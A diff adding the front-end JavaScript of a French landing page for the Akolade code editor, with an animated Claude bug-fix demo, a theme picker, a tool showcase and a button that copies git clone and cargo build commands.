+const diff = '<div class="d"><div class="rm">-     total / releves.len() as f32</div><div class="ad">+     if releves.is_empty() {</div><div class="ad">+         return 0.0;</div><div class="ad">+     }</div><div class="ad">+     total / releves.len() as f32</div></div>';
+async function demo() {
+  for (;;) {
+    chat.innerHTML = '';
+    for (let l = 0; l < CODE.length; l++) {
+      for (let c = 0; c <= CODE[l].length; c += 2) { paint(CODE, c, l); await wait(14); }
+    }
+    paint(CODE, undefined, -1);
+    await wait(700);
+    add('La moyenne plante sur une liste vide. Corrige-la.', 'msg me');
+    await wait(600);
+    const think = add('<i></i>Claude réfléchit…', 'msg think');
+    await wait(1300);
+    think.remove();
+    add('<div class="h"><svg viewBox="0 0 24 24" width="13" height="13" fill="none" stroke="#868c97" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/></svg><em>Lecture</em><code>src/meteo.rs</code><span class="ok">✓</span></div>', 'msg card');
+    await wait(900);
+    const ask = add(`<div class="h"><span>✎</span><em>Modification</em><code>src/meteo.rs</code></div>${diff}<div class="q"><span>Claude demande votre autorisation</span><button>Refuser</button><button class="yes">Autoriser</button></div>`, 'msg card ask');
+    await wait(1800);
+    const yes = ask.querySelector('.yes');
+    yes.classList.add('press'); await wait(260); yes.classList.remove('press');
+    ask.classList.remove('ask');
+    ask.querySelector('.q').outerHTML = '';
+    ask.querySelector('.h').insertAdjacentHTML('beforeend', '<span class="ok">✓</span>');
+    paint(FIXED, undefined, -1, [8, 9, 10]);
+    $('#meteoFile').classList.add('mod');
+    await wait(500);
+    const reply = add('', 'msg reply');
+    await stream(reply, "C'est corrigé : une liste vide renvoie 0.0 au lieu de diviser par zéro.");
+    add('4,1 s, 18,2 k tokens, 0,004 $', 'msg turn');
+    await wait(5200);
+    $('#meteoFile').classList.remove('mod');
+  }
+}
+if (reduced) {
+  paint(FIXED, undefined, -1);
+  add('La moyenne plante sur une liste vide. Corrige-la.', 'msg me in');
+  add(`<div class="h"><span>✎</span><em>Modification</em><code>src/meteo.rs</code><span class="ok">✓</span></div>${diff}`, 'msg card in');
+  add("C'est corrigé : une liste vide renvoie 0.0 au lieu de diviser par zéro.", 'msg reply in');
+} else {
+  paint(CODE, 0, 0);
+  setTimeout(demo, 900);
+}
+
+/* ---------- Languages ribbon (colors from Akolade's languages.rs) ---------- */
+const LANGS = [["JavaScript","#f1d756"],["TypeScript","#4d9df0"],["JSX","#61dafb"],["TSX","#61dafb"],["HTML","#f0764d"],["CSS","#a77bf3"],["SCSS","#cd6799"],["JSON","#e5c07b"],["Python","#4b8bbe"],["Java","#ed8b00"],["C","#7986cb"],["C++","#4c8fd6"],["C#","#9b4f96"],["Go","#00add8"],["Rust","#dea584"],["PHP","#8892bf"],["Ruby","#cc342d"],["Swift","#f05138"],["Kotlin","#a97bff"],["Shell","#89e051"],["PowerShell","#5391fe"],["Dockerfile","#2496ed"],["SQL","#e38c00"],["Markdown","#6cb6ff"],["YAML","#cb171e"],["Vue","#41b883"],["Svelte","#ff3e00"],["Astro","#bc52ee"],["Prisma","#5a67d8"],["GraphQL","#e10098"],["Terraform","#7b42bc"],["Lua","#5a6dff"],["Zig","#f7a41d"],["Elixir","#a07ac2"],["TOML","#c0703a"]];
+const pill = ([n, c]) => `<span class="lang"><i style="background:${c};color:${c}"></i>${n}</span>`;
+const half = Math.ceil(LANGS.length / 2);
+const row1 = LANGS.slice(0, half).map(pill).join(''), row2 = LANGS.slice(half).map(pill).join('');
+$('#langs1').innerHTML = row1 + row1 + row1 + row1;
+$('#langs2').innerHTML = row2 + row2 + row2 + row2;
+
+/* ---------- Tour: the step in view drives the sticky window ---------- */
+const shots = [...document.querySelectorAll('#shots img')], steps = [...document.querySelectorAll('.step')];
+const io = new IntersectionObserver((entries) => {
+  entries.forEach((e) => {
+    if (!e.isIntersecting) return;
+    steps.forEach((s) => s.classList.toggle('on', s === e.target));
+    const i = +e.target.dataset.shot;
+    shots.forEach((img, j) => img.classList.toggle('on', j === i));
+    $('#glow').style.setProperty('--glow', e.target.dataset.glow);
+    $('#rail').style.setProperty('--p', `${((i + 1) / steps.length) * 100}%`);
+  });
+}, { rootMargin: '-45% 0px -45% 0px' });
+steps.forEach((s) => io.observe(s));
+steps[0].classList.add('on');
+
+/* ---------- Theme lab (palettes from Akolade's themes.rs) ---------- */
+const THEMES = [{"name":"Minuit","dark":true,"chrome":"#0f1014","card":"#16181d","border":"#24272e","fg":"#e4e6eb","muted":"#868c97","primary":"#8b9cff","keyword":"#c792ea","function":"#82aaff","types":"#ffcb6b","string":"#a8d68a","number":"#f78c6c","comment":"#5c6773","operator":"#89ddff","property":"#9cdcfe"},{"name":"Abysse","dark":true,"chrome":"#0b1220","card":"#0f172a","border":"#1e2a44","fg":"#dbe4f0","muted":"#7d8ba3","primary":"#38bdf8","keyword":"#c4a7ff","function":"#5fd4f4","types":"#fcd581","string":"#9ee6a9","number":"#ffa37f","comment":"#52607a","operator":"#7dd3fc","property":"#a5c8ff"},{"name":"Forêt","dark":true,"chrome":"#0d1310","card":"#121a16","border":"#223029","fg":"#dde8e1","muted":"#80948a","primary":"#4ade80","keyword":"#f2b880","function":"#7fd1b9","types":"#e8d27c","string":"#b5e48c","number":"#ff9e7a","comment":"#5a6e63","operator":"#8fd3c8","property":"#a8d5c2"},{"name":"Braise","dark":true,"chrome":"#14100e","card":"#1b1613","border":"#30261f","fg":"#eee3d9","muted":"#9a8b7e","primary":"#fb923c","keyword":"#ff8f6b","function":"#f6c177","types":"#9ccfd8","string":"#c3d88a","number":"#e6a5c7","comment":"#6b5d52","operator":"#e9b18a","property":"#d8c1a8"},{"name":"Contraste","dark":true,"chrome":"#000000","card":"#0a0a0a","border":"#3a3a3a","fg":"#ffffff","muted":"#b8b8b8","primary":"#ffd60a","keyword":"#ff7edb","function":"#5cc8ff","types":"#ffd60a","string":"#7ee787","number":"#ffa657","comment":"#9da5b4","operator":"#79c0ff","property":"#d2a8ff"},{"name":"Aube","dark":false,"chrome":"#eef0f4","card":"#ffffff","border":"#e1e4ea","fg":"#1f2328","muted":"#6a7280","primary":"#5b6cf0","keyword":"#8839ef","function":"#1e66f5","types":"#b35900","string":"#2f8a2f","number":"#d2491d","comment":"#8c95a3","operator":"#0b7a8a","property":"#2a5db0"},{"name":"Sable","dark":false,"chrome":"#f1ebe1","card":"#fbf8f2","border":"#e4dccd","fg":"#2b2620","muted":"#7d7366","primary":"#c2611f","keyword":"#a23b72","function":"#2c6e9b","types":"#8a5f00","string":"#4f7a28","number":"#c24e1c","comment":"#9a8f80","operator":"#2a7f7f","property":"#5a4fa0"},{"name":"Lavande","dark":true,"chrome":"#13111c","card":"#1a1726","border":"#2d283f","fg":"#e6e1f5","muted":"#8f88a8","primary":"#b794f6","keyword":"#f19bd4","function":"#9cc4ff","types":"#f5d68a","string":"#b4e4a3","number":"#ffa98a","comment":"#625b7a","operator":"#9ee7e3","property":"#c9b8ff"},{"name":"Océan","dark":true,"chrome":"#081419","card":"#0c1b22","border":"#1a333e","fg":"#d6e9ef","muted":"#7a96a1","primary":"#2dd4bf","keyword":"#7fb7ff","function":"#5ee6c9","types":"#f2d479","string":"#a9e08f","number":"#ff9f80","comment":"#4f6b75","operator":"#89d9f0","property":"#9fd3e8"},{"name":"Ardoise","dark":true,"chrome":"#1b1d21","card":"#212328","border":"#33363d","fg":"#d8dade","muted":"#8b9099","primary":"#7aa2f7","keyword":"#bb9af7","function":"#7dcfff","types":"#e0af68","string":"#9ece6a","number":"#ff9e64","comment":"#5f6570","operator":"#89ddff","property":"#73daca"},{"name":"Menthe","dark":false,"chrome":"#e9f2ee","card":"#fbfefc","border":"#d8e6df","fg":"#1d2a24","muted":"#63766d","primary":"#0f9d74","keyword":"#7c3aed","function":"#0b6fb5","types":"#a15c00","string":"#2d7d2d","number":"#c2410c","comment":"#8a9a92","operator":"#0e7c7b","property":"#2563a8"},{"name":"Pêche","dark":false,"chrome":"#f7ece6","card":"#fffaf7","border":"#eddcd2","fg":"#2e2420","muted":"#86726a","primary":"#e8603c","keyword":"#b1327a","function":"#2f6fae","types":"#9a6200","string":"#4c7a1f","number":"#c2410c","comment":"#a39188","operator":"#1f7f86","property":"#6b4fb0"},{"name":"Encre","dark":true,"chrome":"#0a0a0b","card":"#111113","border":"#24242a","fg":"#e8e8ea","muted":"#8a8a93","primary":"#8ab4ff","keyword":"#c792ea","function":"#82aaff","types":"#ffcb6b","string":"#c3e88d","number":"#f78c6c","comment":"#5c5c66","operator":"#89ddff","property":"#b2ccd6"},{"name":"Aurore","dark":true,"chrome":"#140f1a","card":"#1b1424","border":"#30243f","fg":"#f0e6f7","muted":"#9a8aab","primary":"#ff7ab8","keyword":"#f28fd0","function":"#8fb8ff","types":"#ffd479","string":"#a6e3a1","number":"#ffab70","comment":"#6e5c80","operator":"#7fe0e6","property":"#c7a6ff"},{"name":"Cerise","dark":true,"chrome":"#170c10","card":"#1f1015","border":"#381e27","fg":"#f3e4e8","muted":"#a28890","primary":"#ff5c7a","keyword":"#ff7f9e","function":"#8ec5ff","types":"#f6d58e","string":"#b7df8f","number":"#ffa07a","comment":"#75545e","operator":"#8fd3e8","property":"#e6a5c0"},{"name":"Ambre","dark":true,"chrome":"#15110c","card":"#1c1712","border":"#332a20","fg":"#f0e6d8","muted":"#a39581","primary":"#f5a524","keyword":"#e58f65","function":"#f2c36b","types":"#9fc6a8","string":"#c2d68c","number":"#f08a5d","comment":"#6f6253","operator":"#8fc1c7","property":"#d9b38c"},{"name":"Cobalt","dark":true,"chrome":"#0a1630","card":"#0d1d3d","border":"#1c3460","fg":"#e6eeff","muted":"#8fa3c7","primary":"#4f8cff","keyword":"#ff9d3d","function":"#ffd84a","types":"#7ee0ff","string":"#8fe08a","number":"#ff7ac6","comment":"#5a72a0","operator":"#9fd8ff","property":"#b7c9ff"},{"name":"Papier","dark":false,"chrome":"#f3f3f2","card":"#ffffff","border":"#e3e3e0","fg":"#1f1f1f","muted":"#6e6e6a","primary":"#2f6fed","keyword":"#a626a4","function":"#1f5fbf","types":"#9a6400","string":"#2f7d32","number":"#b5530c","comment":"#9a9a95","operator":"#0f7a7a","property":"#3955a3"},{"name":"Glacier","dark":false,"chrome":"#e8eef5","card":"#f8fbfe","border":"#d6e0ec","fg":"#1b2633","muted":"#627287","primary":"#2b8ad6","keyword":"#6d4fc2","function":"#0b6fb5","types":"#9a5b00","string":"#2e7d4f","number":"#c2410c","comment":"#8a99ab","operator":"#0e7c86","property":"#2f5aa8"},{"name":"Lin","dark":false,"chrome":"#efe9de","card":"#fbf8f2","border":"#e2d9c8","fg":"#2b2620","muted":"#7b7062","primary":"#5f8a3a","keyword":"#8a3f7a","function":"#2f5f8a","types":"#8a5a00","string":"#4f7a26","number":"#b4501a","comment":"#a39785","operator":"#2a7a72","property":"#5a4a9a"}];
+const tw = $('#tw'), chips = $('#chips');
+let auto = !reduced, cur = 0;
+function apply(i) {
+  cur = i;
+  const t = THEMES[i];
+  const set = { chrome: t.chrome, card: t.card, fg: t.fg, muted2: t.muted, primary: t.primary, kw: t.keyword, fn: t.function, ty: t.types, st: t.string, nu: t.number, co: t.comment, op: t.operator, pr: t.property, border: t.border };
+  for (const [k, v] of Object.entries(set)) tw.style.setProperty(`--${k}`, v);
+  $('#twName').textContent = t.name;
+  [...chips.children].forEach((c, j) => { c.classList.toggle('on', j === i); c.setAttribute('aria-checked', j === i); });
+  $('#themeNote').textContent = `${t.name} : thème ${t.dark ? 'sombre' : 'clair'}, accent ${t.primary}.`;
+}
+THEMES.forEach((t, i) => {
+  const b = document.createElement('button');
+  b.className = 'chip'; b.type = 'button'; b.setAttribute('role', 'radio');
+  b.style.setProperty('--chip', t.primary);
+  b.innerHTML = `<span class="dots"><i style="background:${t.card}"></i><i style="background:${t.primary}"></i><i style="background:${t.keyword}"></i></span>${t.name}`;
+  b.addEventListener('click', () => { auto = false; apply(i); });
+  chips.appendChild(b);
+});
+apply(0);
+let labVisible = false;
+new IntersectionObserver(([e]) => { labVisible = e.isIntersecting; }).observe(tw);
+setInterval(() => { if (auto && labVisible) apply((cur + 1) % THEMES.length); }, 2400);
+
+/* ---------- Orbit of tools ---------- */
+const ICON = {
+  git: '<line x1="6" x2="6" y1="3" y2="15"/><circle cx="18" cy="6" r="3"/><circle cx="6" cy="18" r="3"/><path d="M18 9a9 9 0 0 1-9 9"/>',
+  claude: '<path d="M12 4H5a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-6"/><path d="m7 10 3 3-3 3"/><path d="M13 16h4"/><path d="M19 1.5 20.1 4.4 23 5.5 20.1 6.6 19 9.5 17.9 6.6 15 5.5 17.9 4.4Z"/>',
+  http: '<circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/>',
+  docker: '<path d="M22 7.7c0-.6-.4-1.2-.8-1.5l-6.3-3.9a1.72 1.72 0 0 0-1.7 0l-10.3 6c-.5.2-.9.8-.9 1.4v6.6c0 .5.4 1.2.8 1.5l6.3 3.9a1.72 1.72 0 0 0 1.7 0l10.3-6c.5-.3.9-1 .9-1.5Z"/><path d="M10 21.9V14L2.1 9.1"/><path d="m10 14 11.9-6.9"/>',
+  ports: '<path d="M4.9 19.1C1 15.2 1 8.8 4.9 4.9"/><path d="M7.8 16.2c-2.3-2.3-2.3-6.1 0-8.5"/><circle cx="12" cy="12" r="2"/><path d="M16.2 7.8c2.3 2.3 2.3 6.1 0 8.5"/><path d="M19.1 4.9C23 8.8 23 15.1 19.1 19"/>',
+  devtools: '<path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>',
+  forge: '<circle cx="18" cy="18" r="3"/><circle cx="6" cy="6" r="3"/><path d="M13 6h3a2 2 0 0 1 2 2v7"/><line x1="6" x2="6" y1="9" y2="21"/>',
+  tests: '<path d="M14 2v6a2 2 0 0 0 .245.96l5.51 10.08A2 2 0 0 1 18 22H6a2 2 0 0 1-1.755-2.96l5.51-10.08A2 2 0 0 0 10 8V2"/><path d="M6.453 15h11.094"/><path d="M8.5 2h7"/>',
+  db: '<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M3 5V19A9 3 0 0 0 21 19V5"/><path d="M3 12A9 3 0 0 0 21 12"/>',
+  env: '<path d="M2.586 17.414A2 2 0 0 0 2 18.828V21a1 1 0 0 0 1 1h3a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h1a1 1 0 0 0 1-1v-1a1 1 0 0 1 1-1h.172a2 2 0 0 0 1.414-.586l.814-.814a6.5 6.5 0 1 0-4-4z"/><circle cx="16.5" cy="7.5" r=".5"/>',
+  preview: '<path d="M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0"/><circle cx="12" cy="12" r="3"/>',
+  k8s: '<circle cx="12" cy="12" r="8"/><path d="M12 2v7.5"/><path d="m19 5-5.23 5.23"/><path d="M22 12h-7.5"/><path d="m19 19-5.23-5.23"/><path d="M12 14.5V22"/><path d="M10.23 13.77 5 19"/><path d="M9.5 12H2"/><path d="M10.23 10.23 5 5"/><circle cx="12" cy="12" r="2.5"/>',
+  compare: '<path d="M12 3v14"/><path d="M5 10h14"/><path d="M5 21h14"/>',
+  deps: '<path d="M11 21.73a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73z"/><path d="M12 22V12"/><path d="m3.3 7 7.703 4.734a2 2 0 0 0 1.994 0L20.7 7"/>',
+  stats: '<path d="M21 12c.552 0 1.005-.449.95-.998a10 10 0 0 0-8.953-8.951c-.55-.055-.998.398-.998.95v8a1 1 0 0 0 1 1z"/><path d="M21.21 15.89A10 10 0 1 1 8 2.83"/>',
+};
+const TOOLS = [
+  ['git', 'Git', '⇧⌘G', '#f07178', "Modifications et diff, indexation, commits, branches, remises, push et pull. Les fichiers modifiés se colorent dans l'explorateur.", 1],
+  ['claude', 'Claude Code', 'conversation', '#d97757', "Votre propre Claude Code dans un onglet : cartes d'actions, autorisations d'un clic, coût et limites de l'abonnement.", 1],
+  ['http', 'Client HTTP', 'API', '#4d9df0', "Une requête, ses en-têtes et son corps ; la réponse avec son code, sa durée et le JSON mis en forme.", 1],
+  ['docker', 'Docker', 'conteneurs', '#2496ed', 'Démarrer, arrêter, supprimer un conteneur, lire ses logs ou ouvrir un shell dans le terminal.', 1],
+  ['tests', 'Tests', 'cargo, go, pytest, jest, vitest', '#28c840', "Ce qui passe, ce qui casse, le message de chaque échec, et un clic pour ouvrir le test.", 1],
+  ['forge', 'Pull requests', 'GitHub et GitLab', '#b48cff', "Les PR du dépôt, leurs commentaires, l'état des tests et des relectures. Récupérez une branche d'un clic.", 1],
+  ['k8s', 'Kubernetes', 'pods, services', '#326ce5', "Pods, déploiements et services par namespace : logs, shell, mise à l'échelle, redirection de port.", 2],
+  ['db', 'Base de données', 'SQLite', '#5ee0ff', 'Les bases SQLite du projet : tables, lignes et requêtes, en lecture seule par défaut.', 2],
+  ['env', "Variables d'environnement", '.env', '#ffcf5c', 'Les fichiers .env en tableau, secrets masqués, et les variables qui manquent par rapport à .env.example.', 2],
+  ['preview', 'Aperçu en direct', 'HTML, CSS, JS', '#7ee2a1', 'Un serveur local pour vos pages HTML, rechargées toutes seules à chaque enregistrement.', 2],
+  ['ports', 'Ports ouverts', 'serveurs locaux', '#e10098', 'Les programmes qui écoutent sur un port de votre Mac, à ouvrir dans le navigateur ou à arrêter.', 2],
+  ['compare', 'Comparateur', 'diff', '#89ddff', 'Deux textes ou deux fichiers du projet, ligne par ligne ou côte à côte.', 2],
+  ['deps', 'Dépendances', 'npm, Cargo, Python, Go', '#f7a41d', "Les paquets du projet, leurs mises à jour et l'audit de sécurité. Rien n'est jamais installé.", 2],
+  ['stats', 'Statistiques', 'lignes, langages', '#a77bf3', 'Lignes de code par langage, plus gros fichiers, fichiers les plus modifiés et contributeurs.', 2],
+  ['devtools', 'Boîte à outils', 'JSON, Base64, JWT…', '#ffcb6b', 'Les petites conversions du quotidien : JSON, Base64, URL, JWT, SHA-256, horodatages, UUID.', 2],
+];
+const info = $('#info');
+function show(t, btn) {
+  document.querySelectorAll('.tool button').forEach((b) => b.classList.toggle('on', b === btn));
+  info.innerHTML = `<span class="k2">${t[2]}</span><h3 style="color:${t[3]}">${t[1]}</h3><p>${t[4]}</p>`;
+}
+['r1', 'r2'].forEach((ring, ri) => {
+  const list = TOOLS.filter((t) => t[5] === ri + 1);
+  const el = $('#' + ring);
+  list.forEach((t, i) => {
+    const d = document.createElement('div');
+    d.className = 'tool';
+    d.style.setProperty('--a', `${(360 / list.length) * i + (ri ? 12 : 0)}deg`);
+    d.style.setProperty('--r', ri ? 'min(287px, 43vw)' : 'min(186px, 28vw)');
+    d.style.setProperty('--c', t[3]);
+    d.style.setProperty('--d', ri ? '80s' : '50s');
+    d.innerHTML = `<button type="button" aria-label="${t[1]}"><svg viewBox="0 0 24 24">${ICON[t[0]]}</svg></button>`;
+    const b = d.firstChild;
+    b.addEventListener('mouseenter', () => show(t, b));
+    b.addEventListener('focus', () => show(t, b));
+    b.addEventListener('click', () => show(t, b));
+    el.appendChild(d);
+  });
+});
+
+/* ---------- Security scene: lines appear once in view ---------- */
+const term = $('#term');
+new IntersectionObserver(async ([e], obs) => {
+  if (!e.isIntersecting) return;
+  obs.disconnect();
+  for (const ln of term.querySelectorAll('.ln')) { ln.classList.add('in'); await wait(reduced ? 0 : 420); }
+  $('#shield').classList.add('in');
+}, { threshold: 0.4 }).observe(term);
+
+/* ---------- Reveal titles ---------- */
+const rev = new IntersectionObserver((es) => es.forEach((e) => { if (e.isIntersecting) { e.target.classList.add('seen'); rev.unobserve(e.target); } }), { threshold: 0.2 });
+document.querySelectorAll('.reveal').forEach((el) => rev.observe(el));
+
+/* ---------- Copy the install commands ---------- */
+$('#copy').addEventListener('click', async () => {
+  const text = 'git clone https://github.com/emmanuellion/akolade.git\ncd akolade\ncargo run --release';
+  const msg = $('#copyMsg');
+  try {
+    await navigator.clipboard.writeText(text);
+    msg.textContent = 'Copié. Collez-les dans le Terminal.';
+  } catch {
+    msg.textContent = 'La copie a échoué : sélectionnez les commandes à la main.';
+  }
+});
+</script>
 </body>
 </html>
